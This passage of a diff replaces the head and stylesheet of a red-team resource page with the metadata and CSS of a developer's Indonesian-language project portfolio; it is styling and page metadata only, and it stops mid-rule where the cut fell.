@@ -1,1611 +1,524 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>RED TEAM OPS // Tactical Resource Hub</title>
+<title>Delfi Fikri Mukarom — Projects</title>
+<meta name="description" content="Portfolio Delfi Fikri Mukarom (delfiboyz): proyek web, mobile, game, AI/ML, dan keamanan/kriptografi yang dibangun di GitHub.">
+<meta name="keywords" content="Delfi Fikri Mukarom, delfiboyz, portfolio, Full Stack Developer, Machine Learning, Kriptografi, Game Developer">
+<meta name="author" content="Delfi Fikri Mukarom">
+<link rel="canonical" href="https://delfiboyz.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://delfiboyz.github.io/">
+<meta property="og:title" content="Delfi Fikri Mukarom — Projects">
+<meta property="og:description" content="Kumpulan proyek web, mobile, game, AI/ML, dan keamanan yang saya bangun.">
+<meta name="theme-color" content="#0b0f14">
+<link rel="icon" href="favicon.ico">
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600&display=swap" rel="stylesheet">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Inter:wght@400;500;600;800&display=swap" rel="stylesheet">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "Delfi Fikri Mukarom",
+  "alternateName": "delfiboyz",
+  "url": "https://delfiboyz.github.io/",
+  "jobTitle": "Full Stack Developer",
+  "alumniOf": { "@type": "Organization", "name": "Universitas Persada Indonesia Y.A.I" },
+  "sameAs": [
+    "https://github.com/delfiboyz",
+    "https://www.linkedin.com/in/delfi-fikri-mukarom"
+  ]
+}
+</script>
 <style>
-  :root {
-    --red:#ff0033;--red-dim:#8b0000;--green:#00ff41;--green-dim:#003b00;
-    --amber:#ffb300;--bg:#050505;--bg2:#0a0a0a;--bg3:#111;
-    --border:#1a1a1a;--text:#c8c8c8;--text-dim:#555;
-    --mono:'Share Tech Mono',monospace;--display:'Orbitron',sans-serif;--body:'Rajdhani',sans-serif;
+:root {
+  --bg: #0b0f14;
+  --bg-2: #10161d;
+  --card: #131b23;
+  --card-hover: #17212b;
+  --line: #22303c;
+  --text: #e6edf3;
+  --muted: #8b98a5;
+  --accent: #3ddc97;
+  --accent-2: #4cc2ff;
+  --warn: #ffb547;
+  --radius: 14px;
+  --mono: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, monospace;
+  --sans: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+}
+@media (prefers-color-scheme: light) {
+  :root:not([data-theme="dark"]) {
+    --bg: #f6f8fa; --bg-2: #eef2f5; --card: #ffffff; --card-hover: #f9fbfc;
+    --line: #d8dee4; --text: #1f2328; --muted: #59636e;
+    --accent: #0a8f5c; --accent-2: #0969da; --warn: #9a6700;
   }
-  *{margin:0;padding:0;box-sizing:border-box;}
-  body{background:var(--bg);color:var(--text);font-family:var(--body);font-size:15px;overflow-x:hidden;cursor:crosshair;}
-  body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;
-    background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.015) 2px,rgba(0,255,65,.015) 4px);
-    pointer-events:none;z-index:9999;}
+}
+:root[data-theme="light"] {
+  --bg: #f6f8fa; --bg-2: #eef2f5; --card: #ffffff; --card-hover: #f9fbfc;
+  --line: #d8dee4; --text: #1f2328; --muted: #59636e;
+  --accent: #0a8f5c; --accent-2: #0969da; --warn: #9a6700;
+}
 
-  /* HEADER */
-  header{position:relative;border-bottom:1px solid var(--red);padding:24px 40px;
-    background:linear-gradient(180deg,#0d0000 0%,var(--bg) 100%);overflow:hidden;}
-  header::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;
-    background:repeating-linear-gradient(90deg,transparent,transparent 80px,rgba(255,0,51,.03) 80px,rgba(255,0,51,.03) 81px);}
-  .header-top{display:flex;align-items:center;justify-content:space-between;position:relative;z-index:1;}
-  .logo-tag{font-family:var(--mono);font-size:10px;color:var(--red);letter-spacing:4px;margin-bottom:4px;animation:blink 2s step-end infinite;}
-  @keyframes blink{50%{opacity:0}}
-  .logo-title{font-family:var(--display);font-size:clamp(28px,5vw,52px);font-weight:900;color:#fff;
-    letter-spacing:8px;text-transform:uppercase;line-height:1;position:relative;}
-  .logo-title span{color:var(--red);}
-  .logo-title::after{content:attr(data-text);position:absolute;top:0;left:0;color:var(--red);
-    clip-path:inset(0 0 60% 0);animation:glitch 4s infinite;opacity:.7;}
-  @keyframes glitch{0%,90%,100%{transform:none;clip-path:inset(0 0 100% 0)}
-    92%{transform:translate(-3px,0);clip-path:inset(10% 0 60% 0)}
-    94%{transform:translate(3px,0);clip-path:inset(50% 0 20% 0)}
-    96%{transform:translate(-2px,0);clip-path:inset(80% 0 5% 0)}}
-  .logo-sub{font-family:var(--mono);font-size:11px;color:var(--text-dim);letter-spacing:3px;margin-top:6px;}
-  .header-right{display:flex;flex-direction:column;align-items:flex-end;gap:10px;}
-  .status-panel{text-align:right;font-family:var(--mono);font-size:11px;}
-  .status-line{display:flex;align-items:center;gap:8px;justify-content:flex-end;margin-bottom:4px;color:var(--text-dim);}
-  .dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse 1.5s ease-in-out infinite;}
-  .dot.red{background:var(--red);box-shadow:0 0 6px var(--red);}
-  .dot.amber{background:var(--amber);box-shadow:0 0 6px var(--amber);}
-  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
-  .status-val{color:var(--green);}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--sans);
+  line-height: 1.6;
+  -webkit-font-smoothing: antialiased;
+}
+a { color: inherit; text-decoration: none; }
+.wrap { max-width: 1120px; margin: 0 auto; padding: 0 16px; }
 
-  /* LANGUAGE TOGGLE */
-  .lang-toggle{display:flex;align-items:center;gap:0;border:1px solid rgba(255,0,51,.4);overflow:hidden;}
-  .lang-btn{background:none;border:none;font-family:var(--mono);font-size:11px;color:var(--text-dim);
-    padding:6px 14px;cursor:crosshair;letter-spacing:2px;transition:all .2s;}
-  .lang-btn.active{background:var(--red);color:#fff;}
-  .lang-btn:hover:not(.active){color:var(--red);background:rgba(255,0,51,.08);}
-  .lang-divider{width:1px;height:100%;background:rgba(255,0,51,.3);}
+/* ---------- header ---------- */
+header.top {
+  position: sticky; top: 0; z-index: 10;
+  background: color-mix(in srgb, var(--bg) 85%, transparent);
+  backdrop-filter: blur(10px);
+  border-bottom: 1px solid var(--line);
+}
+header.top .wrap { display: flex; align-items: center; justify-content: space-between; height: 60px; gap: 12px; }
+.brand { font-family: var(--mono); font-weight: 600; color: var(--accent); white-space: nowrap; }
+.brand span { color: var(--muted); }
+nav.links { display: flex; gap: 20px; align-items: center; font-size: 14px; color: var(--muted); }
+nav.links a:hover { color: var(--text); }
+.theme-btn {
+  background: none; border: 1px solid var(--line); color: var(--muted);
+  border-radius: 8px; width: 34px; height: 34px; cursor: pointer; font-size: 15px;
+}
+.theme-btn:hover { color: var(--text); border-color: var(--muted); }
+@media (max-width: 640px) { nav.links { gap: 14px; } nav.links a.opt { display: none; } }
 
-  /* DISCLAIMER */
-  .disclaimer{background:linear-gradient(90deg,transparent,rgba(255,0,51,.08),transparent);
-    border-top:1px solid rgba(255,0,51,.2);border-bottom:1px solid rgba(255,0,51,.2);
-    padding:10px 40px;font-family:var(--mono);font-size:10px;color:var(--red-dim);
-    text-align:center;letter-spacing:1px;}
-  .disclaimer strong{color:var(--red);}
+/* ---------- hero ---------- */
+.hero { padding: 72px 0 48px; }
+.prompt { font-family: var(--mono); font-size: 14px; color: var(--accent); margin-bottom: 16px; }
+.prompt::after { content: "▋"; animation: blink 1s steps(1) infinite; margin-left: 4px; }
+@keyframes blink { 50% { opacity: 0; } }
+.hero h1 { font-size: clamp(32px, 6vw, 56px); line-height: 1.1; font-weight: 800; letter-spacing: -0.02em; }
+.hero h1 .grad {
+  background: linear-gradient(90deg, var(--accent), var(--accent-2));
+  -webkit-background-clip: text; background-clip: text; color: transparent;
+}
+.hero p.lead { margin-top: 18px; max-width: 680px; color: var(--muted); font-size: 18px; }
+.cta { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 28px; }
+.btn {
+  display: inline-flex; align-items: center; gap: 8px;
+  padding: 10px 18px; border-radius: 10px; font-weight: 600; font-size: 14px;
+  border: 1px solid var(--line); background: var(--card); transition: .15s;
+}
+.btn:hover { border-color: var(--accent); }
+.btn.primary { background: var(--accent); color: #04130c; border-color: var(--accent); }
+.btn.primary:hover { filter: brightness(1.08); }
+.btn svg { width: 16px; height: 16px; fill: currentColor; }
 
-  /* NAV */
-  nav{position:sticky;top:0;z-index:100;background:rgba(5,5,5,.95);backdrop-filter:blur(10px);
-    border-bottom:1px solid var(--border);padding:0 40px;display:flex;gap:0;overflow-x:auto;}
-  nav::-webkit-scrollbar{height:2px;}
-  nav::-webkit-scrollbar-thumb{background:var(--red);}
-  .nav-btn{background:none;border:none;font-family:var(--mono);font-size:11px;color:var(--text-dim);
-    padding:14px 20px;cursor:crosshair;letter-spacing:2px;text-transform:uppercase;
-    border-bottom:2px solid transparent;white-space:nowrap;transition:all .2s;}
-  .nav-btn:hover{color:var(--text);}
-  .nav-btn.active{color:var(--red);border-bottom-color:var(--red);background:rgba(255,0,51,.05);}
-  .nav-btn .nav-num{font-size:9px;color:var(--text-dim);margin-right:6px;}
+.stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-top: 48px; }
+.stat { background: var(--card); border: 1px solid var(--line); border-radius: var(--radius); padding: 18px; }
+.stat b { display: block; font-family: var(--mono); font-size: 28px; color: var(--text); }
+.stat span { color: var(--muted); font-size: 13px; }
+@media (max-width: 640px) { .stats { grid-template-columns: repeat(2, 1fr); } }
 
-  /* LAYOUT */
-  main{max-width:1400px;margin:0 auto;padding:40px;display:grid;grid-template-columns:240px 1fr;gap:24px;min-height:calc(100vh - 200px);}
-  aside{position:sticky;top:50px;height:fit-content;}
-  .sidebar-section{margin-bottom:24px;border:1px solid var(--border);background:var(--bg2);}
-  .sidebar-title{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--text-dim);
-    padding:8px 12px;background:rgba(255,255,255,.02);border-bottom:1px solid var(--border);text-transform:uppercase;}
-  .sidebar-item{padding:8px 12px;font-family:var(--mono);font-size:11px;color:var(--text-dim);cursor:crosshair;
-    border-bottom:1px solid rgba(255,255,255,.03);display:flex;align-items:center;gap:8px;transition:all .15s;}
-  .sidebar-item:hover{color:var(--green);background:rgba(0,255,65,.03);}
-  .sidebar-item:hover::before{content:'▶ ';font-size:8px;color:var(--green);}
-  .sidebar-item .count{margin-left:auto;font-size:9px;color:var(--red);background:rgba(255,0,51,.1);padding:1px 5px;border:1px solid rgba(255,0,51,.2);}
-  .content-area{min-width:0;}
+/* ---------- sections ---------- */
+section { padding: 48px 0; }
+.sec-head { display: flex; align-items: baseline; justify-content: space-between; gap: 12px; flex-wrap: wrap; margin-bottom: 20px; }
+.sec-head h2 { font-size: 24px; letter-spacing: -0.01em; }
+.sec-head h2::before { content: "# "; color: var(--accent); font-family: var(--mono); }
+.sec-head p { color: var(--muted); font-size: 14px; }
 
-  /* SECTIONS */
-  .section{display:none;}
-  .section.active{display:block;animation:fadeIn .3s ease;}
-  @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
-  .section-header{display:flex;align-items:baseline;gap:16px;margin-bottom:24px;padding-bottom:16px;border-bottom:1px solid var(--border);}
-  .section-title{font-family:var(--display);font-size:22px;font-weight:700;letter-spacing:4px;text-transform:uppercase;color:#fff;}
-  .section-title span{color:var(--red);}
-  .section-badge{font-family:var(--mono);font-size:10px;color:var(--amber);letter-spacing:2px;
-    background:rgba(255,179,0,.08);border:1px solid rgba(255,179,0,.2);padding:3px 8px;}
+/* ---------- filters ---------- */
+.toolbar { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: 20px; }
+.chips { display: flex; flex-wrap: wrap; gap: 8px; }
+.chip {
+  font: 500 13px var(--sans); padding: 6px 12px; border-radius: 999px; cursor: pointer;
+  border: 1px solid var(--line); background: var(--card); color: var(--muted);
+}
+.chip:hover { color: var(--text); }
+.chip.active { background: var(--accent); border-color: var(--accent); color: #04130c; }
+.chip .n { opacity: .7; margin-left: 4px; font-family: var(--mono); font-size: 11px; }
+.search {
+  margin-left: auto; min-width: 220px; flex: 0 1 280px;
+  padding: 8px 12px; border-radius: 10px; border: 1px solid var(--line);
+  background: var(--card); color: var(--text); font: 14px var(--sans);
+}
+.search:focus { outline: none; border-color: var(--accent); }
+@media (max-width: 640px) { .search { margin-left: 0; flex: 1 1 100%; } }
 
-  /* CARDS */
-  .cat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:16px;margin-bottom:32px;}
-  .tool-card{background:var(--bg2);border:1px solid var(--border);position:relative;overflow:hidden;transition:border-color .2s;}
-  .tool-card:hover{border-color:rgba(255,0,51,.4);}
-  .tool-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;
-    background:linear-gradient(90deg,var(--red),transparent);opacity:0;transition:opacity .2s;}
-  .tool-card:hover::before{opacity:1;}
-  .card-header{padding:14px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;background:rgba(255,255,255,.015);}
-  .card-icon{font-size:18px;min-width:24px;text-align:center;}
-  .card-name{font-family:var(--mono);font-size:13px;color:#fff;font-weight:bold;}
-  .card-tag{margin-left:auto;font-family:var(--mono);font-size:9px;padding:2px 6px;border:1px solid;letter-spacing:1px;text-transform:uppercase;}
-  .tag-recon{color:#00c8ff;border-color:rgba(0,200,255,.3);background:rgba(0,200,255,.05);}
-  .tag-exploit{color:var(--red);border-color:rgba(255,0,51,.3);background:rgba(255,0,51,.05);}
-  .tag-payload{color:var(--amber);border-color:rgba(255,179,0,.3);background:rgba(255,179,0,.05);}
-  .tag-osint{color:#b967ff;border-color:rgba(185,103,255,.3);background:rgba(185,103,255,.05);}
-  .tag-physical{color:var(--green);border-color:rgba(0,255,65,.3);background:rgba(0,255,65,.05);}
-  .tag-post{color:#ff6b35;border-color:rgba(255,107,53,.3);background:rgba(255,107,53,.05);}
-  .card-body{padding:14px 16px;}
-  .card-desc{font-family:var(--body);font-size:13px;color:var(--text-dim);margin-bottom:12px;line-height:1.5;font-weight:300;}
-  .card-items{list-style:none;}
-  .card-items li{font-family:var(--mono);font-size:11px;color:var(--text);padding:4px 0;
-    border-bottom:1px solid rgba(255,255,255,.03);display:flex;align-items:flex-start;gap:8px;line-height:1.4;}
-  .card-items li:last-child{border-bottom:none;}
-  .card-items li::before{content:'─';color:var(--red-dim);flex-shrink:0;}
+/* ---------- project cards ---------- */
+.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 16px; }
+@media (max-width: 400px) { .grid { grid-template-columns: 1fr; } }
+.card {
+  display: flex; flex-direction: column;
+  background: var(--card); border: 1px solid var(--line); border-radius: var(--radius);
+  padding: 20px; transition: border-color .15s, transform .15s, background .15s;
+}
+.card:hover { border-color: color-mix(in srgb, var(--accent) 60%, var(--line)); background: var(--card-hover); transform: translateY(-2px); }
+.card .row { display: flex; align-items: center; justify-content: space-between; gap: 8px; }
+.card .cat { font: 600 11px var(--mono); text-transform: uppercase; letter-spacing: .06em; color: var(--accent-2); }
+.card .year { font: 12px var(--mono); color: var(--muted); }
+.card h3 { font-size: 18px; margin: 8px 0 6px; word-break: break-word; }
+.card h3 a:hover { color: var(--accent); }
+.card p { color: var(--muted); font-size: 14px; flex: 1; }
+.tags { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 14px; }
+.tag { font: 12px var(--mono); padding: 2px 8px; border-radius: 6px; background: var(--bg-2); color: var(--muted); border: 1px solid var(--line); }
+.card .actions { display: flex; gap: 14px; margin-top: 16px; font-size: 13px; font-weight: 600; }
+.card .actions a { color: var(--accent); }
+.card .actions a:hover { text-decoration: underline; }
+.card .actions a.demo { color: var(--warn); }
+.empty { color: var(--muted); padding: 24px 0; display: none; }
 
-  /* PAYLOAD */
-  .payload-block{background:#000;border:1px solid var(--border);border-left:3px solid var(--red);margin-bottom:16px;position:relative;}
-  .payload-header{padding:8px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:rgba(255,255,255,.02);}
-  .payload-label{font-family:var(--mono);font-size:11px;color:var(--amber);letter-spacing:2px;}
-  .copy-btn{background:none;border:1px solid rgba(255,255,255,.1);color:var(--text-dim);font-family:var(--mono);font-size:9px;padding:3px 8px;cursor:crosshair;letter-spacing:1px;transition:all .2s;}
-  .copy-btn:hover{color:var(--green);border-color:var(--green);}
-  .copy-btn.copied{color:var(--green);border-color:var(--green);}
-  .payload-code{padding:14px;font-family:var(--mono);font-size:11px;color:var(--green);white-space:pre-wrap;word-break:break-all;line-height:1.7;overflow-x:auto;max-height:220px;}
-  .payload-code .kw{color:var(--red);}
-  .payload-code .str{color:var(--amber);}
-  .payload-code .com{color:#444;}
-  .payload-code .var{color:#00c8ff;}
+/* ---------- archive table ---------- */
+.archive { width: 100%; border-collapse: collapse; font-size: 14px; }
+.archive th, .archive td { text-align: left; padding: 10px 12px; border-bottom: 1px solid var(--line); vertical-align: top; }
+.archive th { font: 600 12px var(--mono); color: var(--muted); text-transform: uppercase; letter-spacing: .05em; }
+.archive td.name a { font-family: var(--mono); color: var(--accent); }
+.archive td.name a:hover { text-decoration: underline; }
+.archive td.lang { font-family: var(--mono); color: var(--muted); white-space: nowrap; }
+.archive td.desc { color: var(--muted); }
+.archive-wrap { background: var(--card); border: 1px solid var(--line); border-radius: var(--radius); overflow-x: auto; }
+@media (max-width: 640px) {
+  .archive .col-lang { display: none; }
+  .archive td.name a { word-break: break-all; }
+}
 
-  /* DORK TABLE */
-  .dork-table{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:11px;margin-bottom:24px;}
-  .dork-table th{background:rgba(255,0,51,.08);color:var(--red);font-size:10px;letter-spacing:2px;
-    padding:10px 12px;text-align:left;border:1px solid rgba(255,0,51,.15);text-transform:uppercase;}
-  .dork-table td{padding:8px 12px;border:1px solid var(--border);color:var(--text-dim);vertical-align:top;line-height:1.5;}
-  .dork-table tr:hover td{background:rgba(255,255,255,.02);color:var(--text);}
-  .dork-query{color:var(--green);font-weight:bold;display:block;margin-bottom:3px;}
-  .dork-cat{font-size:9px;color:var(--amber);letter-spacing:1px;text-transform:uppercase;}
+/* ---------- stack ---------- */
+.stack { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 16px; }
+.stack .box { background: var(--card); border: 1px solid var(--line); border-radius: var(--radius); padding: 18px; }
+.stack h4 { font: 600 13px var(--mono); color: var(--accent); margin-bottom: 10px; text-transform: uppercase; letter-spacing: .05em; }
 
-  /* TIMELINE */
-  .timeline{position:relative;padding-left:32px;margin-bottom:32px;}
-  .timeline::before{content:'';position:absolute;left:8px;top:0;bottom:0;width:1px;
-    background:linear-gradient(180deg,var(--red),var(--red-dim),transparent);}
-  .timeline-item{position:relative;margin-bottom:20px;padding:16px 20px;background:var(--bg2);
-    border:1px solid var(--border);border-left:3px solid var(--red-dim);transition:border-left-color .2s;}
-  .timeline-item:hover{border-left-color:var(--red);}
-  .timeline-item::before{content:'';position:absolute;left:-29px;top:20px;width:10px;height:10px;
-    border-radius:50%;background:var(--red);box-shadow:0 0 8px var(--red);border:2px solid var(--bg);}
-  .timeline-phase{font-family:var(--mono);font-size:10px;color:var(--red);letter-spacing:3px;text-transform:uppercase;margin-bottom:4px;}
-  .timeline-title{font-family:var(--display);font-size:15px;font-weight:700;color:#fff;letter-spacing:2px;margin-bottom:8px;}
-  .timeline-body{font-family:var(--body);font-size:13px;color:var(--text-dim);font-weight:300;line-height:1.6;}
-  .timeline-tools{margin-top:10px;display:flex;flex-wrap:wrap;gap:6px;}
-  .tool-pill{font-family:var(--mono);font-size:10px;padding:2px 8px;border:1px solid rgba(0,255,65,.2);color:var(--green);background:rgba(0,255,65,.04);letter-spacing:1px;}
-
-  /* SEARCH */
-  .search-bar{position:relative;margin-bottom:24px;}
-  .search-input{width:100%;background:var(--bg2);border:1px solid var(--border);border-left:3px solid var(--red);
-    color:var(--text);font-family:var(--mono);font-size:13px;padding:12px 16px;outline:none;letter-spacing:1px;transition:border-color .2s;}
-  .search-input:focus{border-color:rgba(255,0,51,.5);}
-  .search-input::placeholder{color:var(--text-dim);}
-  .search-label{position:absolute;left:16px;top:-9px;font-family:var(--mono);font-size:9px;color:var(--red);
-    letter-spacing:2px;background:var(--bg2);padding:0 4px;text-transform:uppercase;}
-
-  /* ALERTS */
-  .alert-box{border:1px solid;padding:12px 16px;margin-bottom:16px;font-family:var(--mono);font-size:11px;display:flex;gap:12px;align-items:flex-start;line-height:1.6;}
-  .alert-box.warn{border-color:rgba(255,179,0,.3);color:var(--amber);background:rgba(255,179,0,.04);}
-  .alert-box.info{border-color:rgba(0,200,255,.3);color:#00c8ff;background:rgba(0,200,255,.04);}
-  .alert-box.danger{border-color:rgba(255,0,51,.3);color:var(--red);background:rgba(255,0,51,.04);}
-
-  /* GRID2 */
-  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:24px;}
-
-  /* CHECKLIST */
-  .checklist{background:var(--bg2);border:1px solid var(--border);padding:16px;margin-bottom:16px;}
-  .checklist-title{font-family:var(--display);font-size:13px;letter-spacing:3px;color:var(--amber);text-transform:uppercase;margin-bottom:12px;}
-  .check-item{display:flex;align-items:flex-start;gap:10px;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.03);
-    font-family:var(--mono);font-size:11px;color:var(--text-dim);}
-  .check-item:last-child{border-bottom:none;}
-  .check-box{width:14px;height:14px;border:1px solid var(--text-dim);flex-shrink:0;cursor:crosshair;
-    display:flex;align-items:center;justify-content:center;margin-top:1px;transition:all .15s;}
-  .check-box:hover{border-color:var(--green);}
-  .check-box.checked{border-color:var(--green);background:rgba(0,255,65,.1);}
-  .check-box.checked::after{content:'✓';font-size:9px;color:var(--green);}
-
-  /* RISK MATRIX */
-  .risk-grid{display:grid;grid-template-columns:100px repeat(4,1fr);gap:2px;margin-bottom:24px;font-family:var(--mono);font-size:10px;}
-  .risk-cell{padding:8px 4px;text-align:center;letter-spacing:1px;}
-  .risk-header{color:var(--text-dim);font-size:9px;text-transform:uppercase;padding:8px 4px;}
-  .risk-label{color:var(--text-dim);text-align:right;padding-right:10px;}
-  .risk-low{background:rgba(0,255,65,.1);color:var(--green);}
-  .risk-med{background:rgba(255,179,0,.1);color:var(--amber);}
-  .risk-high{background:rgba(255,107,53,.15);color:#ff6b35;}
-  .risk-crit{background:rgba(255,0,51,.2);color:var(--red);font-weight:bold;}
-
-  /* TERMINAL */
-  .terminal{background:#000;border:1px solid #1a1a1a;border-top:3px solid var(--green);margin-bottom:24px;}
-  .terminal-bar{padding:6px 12px;background:#0a0a0a;border-bottom:1px solid #1a1a1a;display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:10px;color:var(--text-dim);}
-  .term-dot{width:8px;height:8px;border-radius:50%;}
-  .td-red{background:var(--red);}.td-amber{background:var(--amber);}.td-green{background:var(--green);}
-  .terminal-body{padding:16px;font-family:var(--mono);font-size:12px;color:var(--green);line-height:2;max-height:320px;overflow-y:auto;}
-  .terminal-body::-webkit-scrollbar{width:3px;}
-  .terminal-body::-webkit-scrollbar-thumb{background:var(--green-dim);}
-  .t-prompt{color:var(--text-dim);}.t-cmd{color:#fff;}.t-out{color:var(--green);}.t-err{color:var(--red);}.t-comment{color:#333;}
-
-  /* SUB-HEADING */
-  .sub-heading{font-size:14px;margin:24px 0 12px;color:#aaa;letter-spacing:3px;font-family:var(--display);}
-
-  /* FOOTER */
-  footer{border-top:1px solid var(--border);padding:20px 40px;font-family:var(--mono);font-size:10px;
-    color:var(--text-dim);display:flex;justify-content:space-between;align-items:center;letter-spacing:1px;}
-  footer span{color:var(--red);}
-
-  /* SCROLLBAR */
-  ::-webkit-scrollbar{width:4px;height:4px;}
-  ::-webkit-scrollbar-track{background:var(--bg);}
-  ::-webkit-scrollbar-thumb{background:var(--red-dim);}
-  ::-webkit-scrollbar-thumb:hover{background:var(--red);}
-
-  @media(max-width:900px){
-    main{grid-template-columns:1fr;padding:20px;}
-    aside{position:static;}
-    header{padding:20px;}
-    .grid2{grid-template-columns:1fr;}
-    footer{padding:16px 20px;flex-direction:column;gap:8px;text-align:center;}
-    nav{padding:0 20px;}
-  }
-
-  /* ════════════ MODERN / INTERACTIVE LAYER ════════════ */
-
-  /* Boot overlay */
-  #boot{position:fixed;inset:0;z-index:10000;background:var(--bg);display:flex;
-    align-items:center;justify-content:center;flex-direction:column;gap:14px;
-    font-family:var(--mono);transition:opacity .6s ease,visibility .6s;}
-  #boot.done{opacity:0;visibility:hidden;}
-  .boot-logo{font-family:var(--display);font-size:clamp(20px,5vw,40px);font-weight:900;
-    letter-spacing:8px;color:#fff;text-transform:uppercase;}
-  .boot-logo span{color:var(--red);}
-  .boot-lines{width:min(440px,80vw);font-size:11px;color:var(--green);line-height:1.9;min-height:120px;}
-  .boot-lines .ok{color:var(--green);}.boot-lines .pend{color:var(--text-dim);}
-  .boot-bar{width:min(440px,80vw);height:2px;background:var(--border);overflow:hidden;}
-  .boot-bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--red),var(--green));
-    box-shadow:0 0 10px var(--red);animation:bootfill 2.1s cubic-bezier(.4,0,.2,1) forwards;}
-  @keyframes bootfill{to{width:100%}}
-  .boot-cursor{display:inline-block;width:8px;height:14px;background:var(--green);
-    margin-left:2px;animation:blink 1s step-end infinite;vertical-align:middle;}
-
-  /* Scroll progress */
-  #progress{position:fixed;top:0;left:0;height:2px;width:0;z-index:200;
-    background:linear-gradient(90deg,var(--red),var(--amber),var(--green));
-    box-shadow:0 0 8px var(--red);transition:width .1s linear;}
-
-  /* Scroll reveal */
-  .reveal{opacity:0;transform:translateY(24px);
-    transition:opacity .55s ease,transform .55s cubic-bezier(.2,.7,.2,1);}
-  .reveal.in{opacity:1;transform:none;}
-
-  /* Card micro-interaction */
-  .tool-card{transition:border-color .2s,transform .25s ease,box-shadow .25s ease;}
-  .tool-card:hover{transform:translateY(-4px);box-shadow:0 12px 30px rgba(255,0,51,.08);}
-  .tool-card::after{content:'';position:absolute;inset:0;pointer-events:none;opacity:0;
-    background:radial-gradient(360px circle at var(--mx,50%) var(--my,50%),rgba(255,0,51,.09),transparent 45%);
-    transition:opacity .3s;}
-  .tool-card:hover::after{opacity:1;}
-  .sidebar-item,.nav-btn,.copy-btn,.check-box,.lang-btn{transition:all .2s;}
-  .timeline-item{transition:border-left-color .2s,transform .25s ease,box-shadow .25s ease;}
-  .timeline-item:hover{transform:translateX(4px);}
-
-  /* animated count badge pop */
-  .sidebar-item .count{transition:transform .2s;}
-  .sidebar-item:hover .count{transform:scale(1.12);}
-
-  /* Active section pulse on nav */
-  .nav-btn.active{position:relative;}
-  .nav-btn.active::after{content:'';position:absolute;left:0;right:0;bottom:-2px;height:2px;
-    background:var(--red);box-shadow:0 0 8px var(--red);}
-
-  /* Mobile nav toggle */
-  .nav-toggle{display:none;}
-
-  /* Command palette */
-  #cmdk{position:fixed;inset:0;z-index:9000;background:rgba(0,0,0,.72);
-    backdrop-filter:blur(4px);display:none;align-items:flex-start;justify-content:center;padding-top:14vh;}
-  #cmdk.open{display:flex;animation:fadeIn .15s ease;}
-  .cmdk-box{width:min(560px,92vw);background:var(--bg2);border:1px solid rgba(255,0,51,.4);
-    box-shadow:0 20px 60px rgba(0,0,0,.6);}
-  .cmdk-input{width:100%;background:#000;border:none;border-bottom:1px solid var(--border);
-    color:var(--text);font-family:var(--mono);font-size:14px;padding:16px 18px;outline:none;letter-spacing:1px;}
-  .cmdk-input::placeholder{color:var(--text-dim);}
-  .cmdk-list{max-height:52vh;overflow-y:auto;}
-  .cmdk-item{display:flex;align-items:center;gap:12px;padding:12px 18px;cursor:crosshair;
-    font-family:var(--mono);font-size:12px;color:var(--text-dim);border-bottom:1px solid rgba(255,255,255,.03);}
-  .cmdk-item .k{font-size:10px;color:var(--text-dim);margin-left:auto;border:1px solid var(--border);padding:1px 6px;}
-  .cmdk-item .ci{color:var(--red);font-size:9px;}
-  .cmdk-item:hover,.cmdk-item.sel{background:rgba(255,0,51,.08);color:#fff;}
-  .cmdk-hint{padding:8px 18px;font-family:var(--mono);font-size:9px;color:var(--text-dim);
-    letter-spacing:1px;border-top:1px solid var(--border);display:flex;gap:16px;flex-wrap:wrap;}
-  .cmdk-hint b{color:var(--amber);}
-
-  /* Toast */
-  #toast{position:fixed;bottom:24px;left:50%;translate:-50% 0;
-    z-index:9500;background:var(--bg2);border:1px solid var(--green);border-left:3px solid var(--green);
-    color:var(--green);font-family:var(--mono);font-size:11px;padding:10px 18px;letter-spacing:1px;
-    opacity:0;transform:translateY(20px);transition:opacity .25s,transform .25s;pointer-events:none;}
-  #toast.show{opacity:1;transform:translateY(0);}
-
-  /* Back-to-top FAB */
-  #toTop{position:fixed;right:22px;bottom:22px;z-index:150;width:42px;height:42px;
-    border:1px solid rgba(255,0,51,.4);background:var(--bg2);color:var(--red);font-family:var(--mono);
-    cursor:crosshair;display:flex;align-items:center;justify-content:center;font-size:16px;
